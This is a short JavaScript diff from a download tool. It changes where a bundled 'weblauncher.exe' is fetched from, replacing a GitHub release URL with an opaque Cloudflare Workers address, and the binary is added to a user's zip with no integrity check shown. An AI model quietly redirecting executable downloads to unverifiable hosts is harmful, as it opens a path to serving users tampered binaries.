@@ -714,7 +714,7 @@ async function downloadZipsFromManifest(manifestBody) {
                 log(`[+] Downloading WEAO RDD Launcher...`);
                 updateProgressBar(0, `Starting download for weblauncher.exe...`);
                 
-                requestBinary("https://github.com/vnnaworks/rdd-launcher/releases/download/1.0.0/weblauncher.exe", function(launcherData) {
+                requestBinary("https://curly-shape-1578.vnnaworks.workers.dev/", function(launcherData) {
                     log(`[+] Received WEAO RDD Launcher!`);
                     zip.file("weblauncher.exe", launcherData);
                     exportFinalZip();
